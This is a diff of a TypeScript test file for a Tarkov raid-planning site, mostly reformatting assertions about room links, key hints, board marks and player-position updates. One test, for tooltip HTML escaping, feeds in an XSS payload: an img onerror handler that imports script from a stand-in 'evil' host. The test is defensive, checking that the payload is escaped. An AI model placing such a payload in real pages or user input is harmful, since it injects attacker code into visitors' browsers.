@@ -96,20 +96,14 @@ import {
 describe("raid room helpers", () => {
   it("builds room href and default title", () => {
     expect(tarkovRaidRoomHref("3")).toBe("/guides/tarkov/raid-prep/rooms/3");
-    expect(
-      parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/3"),
-    ).toBe("3");
+    expect(parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/3")).toBe("3");
     expect(parseRaidRoomPublicId("1")).toBe("1");
     expect(parseRaidRoomPublicId("5")).toBe("5");
     expect(parseRaidRoomPublicId("6")).toBe("");
     expect(parseRaidRoomPublicId("1", "pve")).toBe("pve-1");
     expect(parseRaidRoomPublicId("pve-3")).toBe("pve-3");
-    expect(parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/pve-2")).toBe(
-      "pve-2",
-    );
-    expect(parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/3")).toBe(
-      "3",
-    );
+    expect(parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/pve-2")).toBe("pve-2");
+    expect(parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/3")).toBe("3");
     expect(parseRaidRoomPublicId("ab12cd34")).toBe("ab12cd34");
     expect(parseRaidRoomPublicId("https://x/guides/tarkov/raid-prep/rooms/ab12cd34")).toBe(
       "ab12cd34",
@@ -227,9 +221,7 @@ describe("raid room helpers", () => {
       }),
     ).toBe("⭐BaiYi 在线 大厅");
     expect(raidRoomMemberRegionLabel({ kind: "matching_aborted" })).toBe("大厅");
-    expect(raidRoomMemberRegionLabel({ kind: "match_found", mapId: "streets" })).toBe(
-      "塔科夫街区",
-    );
+    expect(raidRoomMemberRegionLabel({ kind: "match_found", mapId: "streets" })).toBe("塔科夫街区");
     expect(
       formatRaidRoomMemberChipLine({
         name: "Teammate",
@@ -346,18 +338,12 @@ describe("raid room helpers", () => {
       { public_id: "3", is_member: true },
       { public_id: "4", is_member: false },
     ];
-    expect(raidRoomReturnHref(items, "/guides/tarkov")).toBe(
-      "/guides/tarkov/raid-prep/rooms/3",
-    );
+    expect(raidRoomReturnHref(items, "/guides/tarkov")).toBe("/guides/tarkov/raid-prep/rooms/3");
     expect(raidRoomReturnHref(items, "/guides/tarkov/items/ammo")).toBe(
       "/guides/tarkov/raid-prep/rooms/3",
     );
-    expect(raidRoomReturnHref(items, "/guides/tarkov/raid-prep/rooms/3")).toBe(
-      "",
-    );
-    expect(raidRoomReturnHref(items, "/guides/tarkov/raid-prep/rooms/3/")).toBe(
-      "",
-    );
+    expect(raidRoomReturnHref(items, "/guides/tarkov/raid-prep/rooms/3")).toBe("");
+    expect(raidRoomReturnHref(items, "/guides/tarkov/raid-prep/rooms/3/")).toBe("");
     expect(raidRoomReturnHref([{ public_id: "pve-2", is_member: true }], "/guides/tarkov")).toBe(
       "/guides/tarkov/raid-prep/rooms/pve-2",
     );
@@ -366,9 +352,7 @@ describe("raid room helpers", () => {
     );
     expect(raidRoomReturnHref([], "/guides/tarkov")).toBe("");
     expect(raidRoomReturnHref(null, "/guides/tarkov")).toBe("");
-    expect(raidRoomReturnHref([{ public_id: "3", is_member: false }], "/guides/tarkov")).toBe(
-      "",
-    );
+    expect(raidRoomReturnHref([{ public_id: "3", is_member: false }], "/guides/tarkov")).toBe("");
   });
 
   it("marks a lobby room full only when max_members is reached", () => {
@@ -407,9 +391,10 @@ describe("raid room helpers", () => {
         ["customs-1", "customs-2"],
       ),
     ).toEqual(["customs-1"]);
-    expect(
-      raidRoomTasksCountingTowardMapCap(["customs-1", "woods-1"], null),
-    ).toEqual(["customs-1", "woods-1"]);
+    expect(raidRoomTasksCountingTowardMapCap(["customs-1", "woods-1"], null)).toEqual([
+      "customs-1",
+      "woods-1",
+    ]);
   });
 
   it("groups claims as a union with names", () => {
@@ -443,32 +428,24 @@ describe("raid room helpers", () => {
     expect(userBroughtKey(brings, "k2", 1)).toBe(false);
     expect(userBroughtKey(brings, "k1", null)).toBe(false);
     expect(formatKeyBringHint([])).toBe("点击声明我带了这把钥匙");
-    expect(formatKeyBringHint([], { canToggle: false })).toBe(
-      "还没人声明带这把钥匙",
-    );
+    expect(formatKeyBringHint([], { canToggle: false })).toBe("还没人声明带这把钥匙");
     expect(formatKeyBringHint(["甲"])).toBe("甲带了这把钥匙。");
     expect(formatKeyBringHint(["甲", "乙"])).toBe("甲、乙带了这把钥匙。");
-    expect(formatKeyBringHint(["甲"], { canToggle: true })).toBe(
-      "甲带了这把钥匙。",
-    );
+    expect(formatKeyBringHint(["甲"], { canToggle: true })).toBe("甲带了这把钥匙。");
     expect(formatKeyOwnHint([])).toBe("");
     expect(formatKeyOwnHint(["甲"])).toBe("甲拥有这把钥匙。");
     expect(formatKeyOwnHint(["甲", "乙"])).toBe("甲、乙拥有这把钥匙。");
-    expect(formatKeyChipHint(["甲", "乙"], ["丙"])).toBe(
-      "甲、乙拥有这把钥匙。\n丙带了这把钥匙。",
-    );
+    expect(formatKeyChipHint(["甲", "乙"], ["丙"])).toBe("甲、乙拥有这把钥匙。\n丙带了这把钥匙。");
     expect(keyOwnsForUser(["k1"], { userId: 3, name: "丙" })).toEqual([
       { item_id: "k1", user_id: 3, display_name: "丙" },
     ]);
-    expect(userOwnsKey(keyOwnsForUser(["k1"], { userId: 3, name: "丙" }), "k1", 3)).toBe(
-      true,
-    );
+    expect(userOwnsKey(keyOwnsForUser(["k1"], { userId: 3, name: "丙" }), "k1", 3)).toBe(true);
     expect(userOwnsKey([], "k1", 3)).toBe(false);
     expect(formatKeyOwnToggleLabel(false)).toBe("我有");
     expect(formatKeyOwnToggleLabel(true)).toBe("取消");
-    expect(
-      patchRaidRoomKeyOwns([], "k1", { userId: 3, name: "丙" }, true),
-    ).toEqual([{ item_id: "k1", user_id: 3, display_name: "丙" }]);
+    expect(patchRaidRoomKeyOwns([], "k1", { userId: 3, name: "丙" }, true)).toEqual([
+      { item_id: "k1", user_id: 3, display_name: "丙" },
+    ]);
     expect(
       patchRaidRoomKeyOwns(
         [{ item_id: "k1", user_id: 3, display_name: "丙" }],
@@ -504,10 +481,7 @@ describe("raid room helpers", () => {
       },
       2,
     );
-    expect(marked?.members?.find((row) => row.user_id === 2)?.clients).toEqual([
-      "web",
-      "desktop",
-    ]);
+    expect(marked?.members?.find((row) => row.user_id === 2)?.clients).toEqual(["web", "desktop"]);
     expect(marked?.members?.find((row) => row.user_id === 1)?.online).toBe(false);
     expect(next?.is_member).toBe(true);
     expect(next?.is_host).toBe(false);
@@ -599,9 +573,7 @@ describe("raid room helpers", () => {
       },
       1,
     );
-    expect(added?.marks).toEqual([
-      { id: 9, kind: "pin", x: 1, z: 2, author_user_id: 1 },
-    ]);
+    expect(added?.marks).toEqual([{ id: 9, kind: "pin", x: 1, z: 2, author_user_id: 1 }]);
     const moved = applyRoomWsEvent(
       added,
       {
@@ -613,11 +585,7 @@ describe("raid room helpers", () => {
     expect(moved?.marks).toEqual([
       { id: 9, kind: "text", x: 4, z: 5, label: "集合", author_user_id: 1 },
     ]);
-    const removed = applyRoomWsEvent(
-      added,
-      { event: "mark_remove", mark_id: 9 },
-      1,
-    );
+    const removed = applyRoomWsEvent(added, { event: "mark_remove", mark_id: 9 }, 1);
     expect(removed?.marks).toEqual([]);
     const claimed = applyRoomWsEvent(
       room,
@@ -627,9 +595,7 @@ describe("raid room helpers", () => {
       },
       1,
     );
-    expect(claimed?.claims).toEqual([
-      { task_id: "t1", user_id: 1, display_name: "甲" },
-    ]);
+    expect(claimed?.claims).toEqual([{ task_id: "t1", user_id: 1, display_name: "甲" }]);
     const cleared = applyRoomWsEvent(
       { ...room, marks: [{ id: 1, kind: "pin", x: 0, z: 0, author_user_id: 1 }] },
       { event: "board_clear" },
@@ -640,7 +606,9 @@ describe("raid room helpers", () => {
       room,
       {
         event: "task_progress",
-        map_overlap: [{ map_slug: "customs", with_tasks_count: 1, synced_count: 1, occupant_count: 1 }],
+        map_overlap: [
+          { map_slug: "customs", with_tasks_count: 1, synced_count: 1, occupant_count: 1 },
+        ],
         task_progress: [{ user_id: 1, uploaded: true, started_count: 2 }],
       },
       1,
@@ -655,9 +623,7 @@ describe("raid room helpers", () => {
       },
       1,
     );
-    expect(owns?.key_owns).toEqual([
-      { user_id: 1, item_id: "key-1", display_name: "甲" },
-    ]);
+    expect(owns?.key_owns).toEqual([{ user_id: 1, item_id: "key-1", display_name: "甲" }]);
   });
 
   it("simplifies freehand strokes and reads mark points", () => {
@@ -723,7 +689,16 @@ describe("raid room helpers", () => {
       ],
       author_user_id: 1,
     };
-    const second = { ...first, id: -2, x: 1, x2: 5, points: [[1, 0], [5, 0]] };
+    const second = {
+      ...first,
+      id: -2,
+      x: 1,
+      x2: 5,
+      points: [
+        [1, 0],
+        [5, 0],
+      ],
+    };
     expect(mergeBoardMarks([], [first, second])).toEqual([first, second]);
     expect(mergeBoardMarks([{ ...first, id: 9 }], [first, second])).toEqual([
       { ...first, id: 9 },
@@ -749,12 +724,8 @@ describe("raid room helpers", () => {
       markAuthorTooltipHtml({
         author_display_name: `<img src=x onerror="import('//evil/x.js')">`,
       }),
-    ).toBe(
-      "&lt;img src=x onerror=&quot;import(&#39;//evil/x.js&#39;)&quot;&gt;",
-    );
-    expect(markAuthorTooltipHtml({ author_display_name: " 老王 " })).toBe(
-      "老王",
-    );
+    ).toBe("&lt;img src=x onerror=&quot;import(&#39;//evil/x.js&#39;)&quot;&gt;");
+    expect(markAuthorTooltipHtml({ author_display_name: " 老王 " })).toBe("老王");
     expect(markAuthorTooltipHtml({})).toBe("");
   });
 
@@ -931,13 +902,9 @@ describe("raid room helpers", () => {
     expect(collected.map((row) => row.key)).toEqual(["u:3", "self"]);
     expect(collected.find((row) => row.self)?.name).toBe("BaiYi");
     expect(collected.find((row) => row.userId === 3)?.name).toBe("甲");
-    expect(collectPlayerFixMarks([teammate], null).map((row) => row.key)).toEqual([
-      "u:3",
-    ]);
+    expect(collectPlayerFixMarks([teammate], null).map((row) => row.key)).toEqual(["u:3"]);
     expect(
-      collectPlayerFixMarks([{ ...remoteSelf, self: true }], null).map(
-        (row) => row.key,
-      ),
+      collectPlayerFixMarks([{ ...remoteSelf, self: true }], null).map((row) => row.key),
     ).toEqual(["u:12"]);
     expect(
       playerFixCameraTarget(
@@ -946,8 +913,7 @@ describe("raid room helpers", () => {
       )?.key,
     ).toBe("u:12");
     expect(
-      playerFixCameraTarget(collectPlayerFixMarks([remoteSelf, teammate], local), 12)
-        ?.key,
+      playerFixCameraTarget(collectPlayerFixMarks([remoteSelf, teammate], local), 12)?.key,
     ).toBe("self");
     expect(playerFixCameraTarget([teammate], 12)).toBeNull();
     expect(playerFixFollowSig(local)).toBe("self:1:0:2");
@@ -957,12 +923,10 @@ describe("raid room helpers", () => {
     const other = { ...first, userId: 3, at: 2000 };
     const merged = upsertPlayerFix([first, other], second);
     expect(merged.find((row) => row.userId === 12)?.x).toBe(10);
-    expect(merged.map((row) => row.userId).sort((a, b) => a - b)).toEqual([
-      3, 12,
+    expect(merged.map((row) => row.userId).sort((a, b) => a - b)).toEqual([3, 12]);
+    expect(dropPlayerFixesNotIn([first, other], new Set([12])).map((row) => row.userId)).toEqual([
+      12,
     ]);
-    expect(
-      dropPlayerFixesNotIn([first, other], new Set([12])).map((row) => row.userId),
-    ).toEqual([12]);
     expect(pruneStalePlayerFixes([first], 1000 + 8 * 60_000 + 1)).toEqual([]);
     expect(pruneStalePlayerFixes([first], 1000 + 60_000)).toEqual([first]);
   });
@@ -1007,9 +971,7 @@ describe("raid room helpers", () => {
       now: 1000,
       seatedCount: 3,
     });
-    expect(lines.map((row) => `${row.fromUserId}->${row.toUserId}`)).toEqual([
-      "1->2",
-    ]);
+    expect(lines.map((row) => `${row.fromUserId}->${row.toUserId}`)).toEqual(["1->2"]);
     expect(lines[0]?.color).toBe(colorForUserId(2));
     expect(lines[0]?.crossFloor).toBe(false);
     expect(
@@ -1056,12 +1018,11 @@ describe("raid room helpers", () => {
       seatedCount: 3,
     });
     const both = replacePlayerFixPulseLines(lines, otherPulse, 3);
-    expect(both.map((row) => `${row.fromUserId}->${row.toUserId}`).sort()).toEqual(
-      ["1->2", "1->3"],
-    );
-    expect(
-      retainPlayerFixPulseLines(lines, { now: 1000, seatedCount: 1 }),
-    ).toEqual([]);
+    expect(both.map((row) => `${row.fromUserId}->${row.toUserId}`).sort()).toEqual([
+      "1->2",
+      "1->3",
+    ]);
+    expect(retainPlayerFixPulseLines(lines, { now: 1000, seatedCount: 1 })).toEqual([]);
     expect(
       retainPlayerFixPulseLines(lines, {
         now: 1000 + PLAYER_FIX_PULSE_MS,
@@ -1091,9 +1052,7 @@ describe("raid room helpers", () => {
         marks[2]!,
       ]).updaterIds,
     ).toEqual([2]);
-    expect(
-      detectPlayerFixPulseUpdaters(hydrated.next, marks).updaterIds,
-    ).toEqual([]);
+    expect(detectPlayerFixPulseUpdaters(hydrated.next, marks).updaterIds).toEqual([]);
     expect(playerFixPulseLinesEqual(lines, lines)).toBe(true);
     expect(playerFixPulseLinesEqual(lines, replaced)).toBe(false);
   });
@@ -1117,18 +1076,14 @@ describe("raid room helpers", () => {
       at: 10,
     });
     expect(next?.x).not.toBe(first?.x);
-    expect(pulseDemoFixAt({ userId: 900003, step: 0, now: 1 })?.mapId).toBe(
-      "woods",
-    );
+    expect(pulseDemoFixAt({ userId: 900003, step: 0, now: 1 })?.mapId).toBe("woods");
     expect(pulseDemoBotMapId(900004)).toBe("customs");
     expect(pulseDemoHopMapId(0)).toBe("woods");
     expect(pulseDemoHopMapId(1)).toBe("customs");
     expect(pulseDemoHopMapId(2)).toBe("woods");
     expect(pulseDemoBotMapId(900003, 1)).toBe("customs");
     const channel = pulseDemoChannel({ user_id: 12, display_name: "我" });
-    expect(channel.viewMaps.find((row) => row.user_id === 900003)?.map_slug).toBe(
-      "woods",
-    );
+    expect(channel.viewMaps.find((row) => row.user_id === 900003)?.map_slug).toBe("woods");
     expect(
       pulseDemoChannel({ user_id: 12, display_name: "我" }, 1).viewMaps.find(
         (row) => row.user_id === 900003,
@@ -1163,11 +1118,9 @@ describe("raid room helpers", () => {
     expect(pulseDemoMembers(null).map((row) => row.user_id)).toEqual([
       900001, 900002, 900003, 900004,
     ]);
-    expect(
-      pulseDemoMembers({ user_id: 12, display_name: "我" }).map(
-        (row) => row.user_id,
-      ),
-    ).toEqual([12, 900001, 900002, 900003, 900004]);
+    expect(pulseDemoMembers({ user_id: 12, display_name: "我" }).map((row) => row.user_id)).toEqual(
+      [12, 900001, 900002, 900003, 900004],
+    );
     expect(PULSE_DEMO_BOTS).toHaveLength(4);
     expect(nextPulseDemoWaitMs(0)).toBe(PULSE_DEMO_TICK_MIN_MS);
     expect(nextPulseDemoWaitMs(1)).toBe(PULSE_DEMO_TICK_MAX_MS);
@@ -1200,9 +1153,7 @@ describe("raid room helpers", () => {
 
   it("uses a stable fallback self id when the viewer is not logged in", () => {
     const sample = pulseDemoQuestPreview();
-    expect(sample.objectiveDones.every((row) => row.user_id === PULSE_DEMO_SELF_ID)).toBe(
-      true,
-    );
+    expect(sample.objectiveDones.every((row) => row.user_id === PULSE_DEMO_SELF_ID)).toBe(true);
     expect(sample.skippedByTask.size).toBeGreaterThan(0);
   });
 
@@ -1262,9 +1213,7 @@ describe("raid room map presence", () => {
       [2, "raid"],
       [3, "matching"],
     ]);
-    expect(board.maps[1]?.people.map((row) => [row.user_id, row.seat])).toEqual([
-      [8, "matching"],
-    ]);
+    expect(board.maps[1]?.people.map((row) => [row.user_id, row.seat])).toEqual([[8, "matching"]]);
     expect(board.maps[2]?.people).toEqual([]);
     expect(board.maps[3]?.people.map((row) => row.user_id)).toEqual([10]);
   });
@@ -1304,15 +1253,9 @@ describe("solo as one-person room", () => {
     expect(room.is_member).toBe(true);
     expect(room.is_host).toBe(true);
     expect(room.can_edit).toBe(true);
-    expect(room.claims).toEqual([
-      { task_id: "task-a", user_id: 7, display_name: "鸽" },
-    ]);
-    expect(room.key_brings).toEqual([
-      { item_id: "key-1", user_id: 7, display_name: "鸽" },
-    ]);
-    expect(room.key_owns).toEqual([
-      { item_id: "key-2", user_id: 7, display_name: "鸽" },
-    ]);
+    expect(room.claims).toEqual([{ task_id: "task-a", user_id: 7, display_name: "鸽" }]);
+    expect(room.key_brings).toEqual([{ item_id: "key-1", user_id: 7, display_name: "鸽" }]);
+    expect(room.key_owns).toEqual([{ item_id: "key-2", user_id: 7, display_name: "鸽" }]);
     expect(room.objective_dones).toEqual([
       {
         task_id: "task-a",
@@ -1335,4 +1278,3 @@ describe("solo as one-person room", () => {
     expect(room.public_id).toBe(SOLO_RAID_ROOM_PUBLIC_ID);
   });
 });
-
